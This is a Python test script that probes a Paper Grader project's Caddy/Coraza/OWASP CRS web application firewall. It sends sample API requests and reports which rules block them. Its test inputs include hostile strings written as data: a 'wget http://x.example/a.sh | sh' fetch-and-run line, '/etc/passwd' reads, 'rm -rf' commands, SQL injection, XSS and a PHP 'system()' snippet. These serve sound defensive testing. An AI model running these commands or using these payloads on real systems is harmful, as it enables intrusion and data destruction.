"""scripts/waf-probe.py: check what the WAF lets through, without starting the stack.

Needs podman, the gateway image (built by ./run.sh up or: podman build -f gateway/Dockerfile -t localhost/papergrader/gateway:local .)
and httpx (in the repo .venv). SKIP_BIG=1 skips the 30 and 100 MB uploads.

Throw realistic Paper Grader API requests at the REAL (waf) snippet of gateway/Caddyfile (Caddy + Coraza + OWASP CRS)
and report which are blocked and by which rule. Usage: python probe.py [label]"""
import json, os, re, subprocess, sys, tempfile, time
import httpx

R = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))  # the repository root
S = tempfile.mkdtemp(prefix="waf-probe-")  # scratch: the generated Caddyfile and the WAF log
IMG = os.environ.get("GATEWAY_IMAGE", "localhost/papergrader/gateway:local")
PORT = 28651
NAME = "wafprobe"
label = sys.argv[1] if len(sys.argv) > 1 else "run"

# 1. a test Caddyfile that is the real (waf) snippet in front of a stub that answers 200 to anything
src = open(f"{R}/gateway/Caddyfile").read()
i = src.index("(waf) {")
depth, k = 0, src.index("{", i)
while True:
    depth += src[k] == "{"
    depth -= src[k] == "}"
    if depth == 0:
        break
    k += 1
snippet = src[i:k + 1]
open(f"{S}/Caddyfile.probe", "w").write(
    "{\n\tauto_https off\n\torder coraza_waf first\n}\n" + snippet + "\n:8080 {\n\timport waf\n"
    "\t@jleak path /probe/json-leak\n\thandle @jleak {\n\t\theader Content-Type application/json\n"
    "\t\trespond `{\"detail\":\"You have an error in your SQL syntax; <?php system($_GET[1]); ?> Traceback (most recent call last)\"}` 200\n\t}\n"
    "\t@hleak path /probe/html-leak\n\thandle @hleak {\n\t\theader Content-Type text/html\n"
    "\t\trespond \"<html><body>Fatal error: Uncaught Exception in /var/www/x.php on line 3</body></html>\" 200\n\t}\n"
    "\trespond \"ok\" 200\n}\n")

subprocess.run(["podman", "rm", "-f", NAME], capture_output=True)
subprocess.run(["podman", "run", "-d", "--rm", "--name", NAME, "-p", f"127.0.0.1:{PORT}:8080",
                "-e", "DOMAIN=lan.internal", "-e", "LLDAP_ADMIN_USERS=admin",
                "-v", f"{S}/Caddyfile.probe:/etc/caddy/Caddyfile:ro,z", IMG], capture_output=True, check=True)
base = f"http://127.0.0.1:{PORT}"
for _ in range(60):
    try:
        httpx.get(base + "/", timeout=1); break
    except Exception:
        time.sleep(0.5)

H = {"Host": "lan.internal:5904", "Origin": "https://lan.internal:5904",
     "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0", "Cookie": "tinyauth-session=abc123"}
c = httpx.Client(base_url=base, headers=H, timeout=120)

TEXTS = {
    "plain": "Good explanation of the pipeline hazard. Lost 1 mark for forgetting the stall.",
    "asm": "mov eax, [ebp+8]; add eax, 4; ret  ; pops EIP, ESP += 4\npush ebp\nmov ebp, esp\nsub esp, 0x10",
    "c": "for (i = 0; i < n && a[i] != 0; i++) { sum += a[i] | 1; } if (x <= 3 || y >= 9) return -1;",
    "sql": "SELECT name FROM students WHERE id = 1 OR 1=1 -- ; DROP TABLE exams; UNION SELECT password FROM users",
    "shell": "cat /etc/passwd | grep root; ls -la /tmp && rm -rf ./build; wget http://x.example/a.sh | sh; adduser bob; $(whoami)",
    "html": "Explain why <script>alert(1)</script> and <img src=x onerror=alert(1)> are dangerous; javascript:void(0)",
    "latex": r"\frac{a}{b} \cdot \sum_{i=0}^{n} x_i^2 \leq \int_0^1 f(x)\,dx   (see ../../notes/week1.pdf)",
    "quotes": "Student's answer: \"O'Brien\" said `echo \"hi\"` -- it's 5 > 3 & 2 < 4; 100% correct?",
}

def rubric(extra_text):
    return {"questions": [
        {"number": "1", "text": extra_text, "max_points": 4, "expected_answer": extra_text,
         "criteria": [{"description": extra_text, "points": 3}, {"description": "Penalty", "points": -1}]}]}

cases = []
def add(name, method, path, **kw):
    cases.append((name, method, path, kw))

sample = json.load(open(f"{R}/samples/rubric.json"))
add("rubric: samples/rubric.json", "POST", "/api/exams/1/rubrics", json=sample)
for k, t in TEXTS.items():
    add(f"rubric text: {k}", "POST", "/api/exams/1/rubrics", json=rubric(t))
big = {"questions": [{"number": str(n), "text": TEXTS["plain"] * 60, "max_points": 2, "expected_answer": TEXTS["asm"] * 40,
                       "criteria": [{"description": TEXTS["plain"] * 5, "points": 1}]} for n in range(1, 61)]}
add(f"rubric: big JSON ({len(json.dumps(big)) // 1024} KB)", "POST", "/api/exams/1/rubrics", json=big)
add("rubric.pdf: sample", "POST", "/api/exams/1/rubric.pdf", json={**sample, "version": 2})
for k, t in TEXTS.items():
    add(f"grade feedback: {k}", "PATCH", "/api/grades/7", json={"version": 1, "final_score": 3.5, "final_feedback": t})
add("grade: numbers only", "PATCH", "/api/grades/7", json={"version": 2, "final_score": -1.0})
add("exam name with symbols", "POST", "/api/exams", json={"name": "EE2003 End-Sem (Set B) - O'Brien & Co <draft> 50% [v2]"})
add("exam rename", "PATCH", "/api/exams/1", json={"name": "Midterm; Part 1 -- retake", "model_override": "claude-sonnet-5-5"})
add("student rename", "PATCH", "/api/students/3", json={"external_id": "EE24B019", "name": "D'Souza, Ann-Marie (Dr.)"})
add("students upsert", "POST", "/api/students", json=[{"external_id": "EE24B019", "name": "O'Neil"}])
add("bulk assign", "PUT", "/api/submissions/bulk/assignment", json={"submission_ids": list(range(1, 150)), "ta_ids": [2, 3], "mode": "add"})
add("bulk grade", "POST", "/api/submissions/bulk/grade", json={"submission_ids": list(range(1, 150)), "force": False})
add("bulk delete", "POST", "/api/submissions/bulk/delete", json={"submission_ids": [1, 2, 3], "force": True})
add("single assignment", "PUT", "/api/submissions/5/assignment", json={"ta_ids": [1, 2]})
add("regrade", "POST", "/api/submissions/5/regrade", json={"rubric_version": 2, "force": True})
splits = [{"student_external_id": f"EE24B{n:03d}", "student_name": "D'Souza", "first_page": n * 2 - 1, "last_page": n * 2, "ta_ids": [1]} for n in range(1, 151)]
add("auto-split commit (150 rows)", "POST", "/api/exams/1/imports/auto-split/" + "a" * 32 + "/commit", json={"items": splits})
add("queue (no body)", "POST", "/api/exams/1/queue", content=b"", headers={"content-type": "application/json"})
add("complete (no body)", "POST", "/api/submissions/5/complete", content=b"", headers={"content-type": "application/json"})
add("usage probe", "POST", "/api/grader/usage", content=b"", headers={"content-type": "application/json"})

pdf_small = open(f"{R}/samples/combined-answers.pdf", "rb").read()
csv_map = open(f"{R}/samples/files-mapping.csv", "rb").read()
csv_roll = open(f"{R}/samples/roll-numbers.csv", "rb").read()
add("import: files + mapping csv", "POST", "/api/exams/1/imports",
    files=[("files", ("EE24B019.pdf", pdf_small, "application/pdf")), ("files", ("EE24B024 (1).pdf", pdf_small, "application/pdf")),
           ("mapping_csv", ("map.csv", csv_map, "text/csv"))], data={"assign": "csv", "reviewers_per_paper": "2", "dry_run": "true"})
add("import: combined pdf + csv", "POST", "/api/exams/1/imports",
    files=[("files", ("combined-answers.pdf", pdf_small, "application/pdf")), ("mapping_csv", ("combined-mapping.csv", csv_map, "text/csv"))],
    data={"assign": "round_robin", "dry_run": "false"})
add("auto-split upload + roster csv", "POST", "/api/exams/1/imports/auto-split",
    files=[("file", ("combined-answers.pdf", pdf_small, "application/pdf")), ("roll_numbers_csv", ("roll.csv", csv_roll, "text/csv"))])
for mb in ((14, 30, 100) if not os.environ.get("SKIP_BIG") else (14,)):
    blob = b"%PDF-1.4\n" + os.urandom(mb * 1024 * 1024)
    add(f"import: {mb} MB pdf", "POST", "/api/exams/1/imports", files=[("files", ("EE24B019.pdf", blob, "application/pdf"))], data={"dry_run": "true"})


for nm in ("Database Systems: SELECT / UNION / JOIN", "Signals and Systems -- 50% | Set A/B", 'O\'Reilly\'s "Quiz" (draft)'):
    add(f"exam name: {nm[:30]}", "POST", "/api/exams", json={"name": nm})
    add(f"student name: {nm[:30]}", "PATCH", "/api/students/3", json={"external_id": "EE24B019", "name": nm})
add("control: attack-like student name (stays blocked)", "POST", "/api/exams/1/imports/auto-split/" + "a" * 32 + "/commit",
    json={"items": [{"student_external_id": "EE24B019", "student_name": "Bob'; DROP TABLE x;--", "first_page": 1, "last_page": 2, "ta_ids": [1]}]})
add("GET submissions filter", "GET", "/api/submissions?exam_id=1&status=ready_for_review")
add("GET export zip ids", "GET", "/api/exams/1/export.zip?ids=" + ",".join(str(n) for n in range(1, 400)))
add("GET export zip raw", "GET", "/api/exams/1/export.zip?raw=true&ids=3,4")
add("GET export.csv", "GET", "/api/exams/1/export.csv")
add("GET page image", "GET", "/api/submissions/5/pages/2/image")
add("GET auto-split thumb", "GET", "/api/exams/1/imports/auto-split/" + "a" * 32 + "/pages/3/thumb")
add("GET detail", "GET", "/api/submissions/5/detail")
add("DELETE force", "DELETE", "/api/submissions/5?force=true")
add("DELETE exam force", "DELETE", "/api/exams/2?force=true")
add("page loads: /admin/exams/1", "GET", "/admin/exams/1")
add("page: /review/5", "GET", "/review/5")
add("response: JSON that mentions SQL errors / php", "GET", "/probe/json-leak")
add("control: HTML response with a PHP-style error (stays blocked)", "GET", "/probe/html-leak")
add("control: attack-like exam name (stays blocked)", "POST", "/api/exams", json={"name": "Intro <script>alert(1)</script>; rm -rf /"})
add("control: XSS in the URL (must stay blocked)", "GET", "/?q=<script>alert(1)</script>")
add("control: SQLi in the URL (must stay blocked)", "GET", "/api/submissions?status=x'%20OR%201=1--")

print(f"== {label}")
for name, method, path, kw in cases:
    try:
        r = c.request(method, path, **kw)
        code = r.status_code
    except Exception as e:
        code = f"ERR {type(e).__name__}"
    ctl = name.startswith("control")
    ok = (code != 200) if ctl else (code == 200)
    print(f"  {str(code):>4}  {method:6} {name}{'' if ok else '   <-- UNEXPECTED'}")

import base64, random
def b64(n): return base64.urlsafe_b64encode(os.urandom(n)).decode().rstrip("=")
bad = {}
random.seed(7)
for i in range(600):
    jwt = b64(40) + "." + b64(random.randint(60, 220)) + "." + b64(43)
    for cname in ("tinyauth-session", "token", "refresh_token"):
        try:
            r = c.get("/api/submissions", headers={"Cookie": f"{cname}={jwt}"})
        except Exception:
            continue
        if r.status_code != 200:
            bad.setdefault(cname, []).append(jwt[:60])
print("cookie fuzz: 600 random JWT-like cookies x3 names ->", {k: len(v) for k, v in bad.items()} or "all passed")
time.sleep(1)
logs = subprocess.run(["podman", "logs", NAME], capture_output=True, text=True); logs = logs.stdout + logs.stderr
open(f"{S}/probe.log", "w").write(logs)
print("log lines:", len(logs.splitlines()), " with Coraza:", logs.count("Coraza"))
hits = {}
for line in logs.splitlines():
    if "Coraza:" not in line or not line.startswith("{"):
        continue
    try:
        m = json.loads(line)["msg"]
    except Exception:
        continue
    rid = re.search(r'\[id "(\d+)"\]', m); uri = re.search(r'\[uri "([^"]*)"\]', m); msg = re.search(r'\[msg "([^"]*)"\]', m)
    data = re.search(r'\[data "([^"]{0,110})', m)
    if rid and rid.group(1) != "949110":
        hits.setdefault((uri.group(1) if uri else "?", rid.group(1), msg.group(1) if msg else ""), data.group(1) if data else "")
print("\n== rule hits (excluding the final 949110 verdict)")
for (uri, rid, msg), data in sorted(hits.items()):
    print(f"  {rid}  {uri[:58]:58}  {msg[:62]}")
    print(f"        {data[:105]!r}")
subprocess.run(["podman", "stop", NAME], capture_output=True)
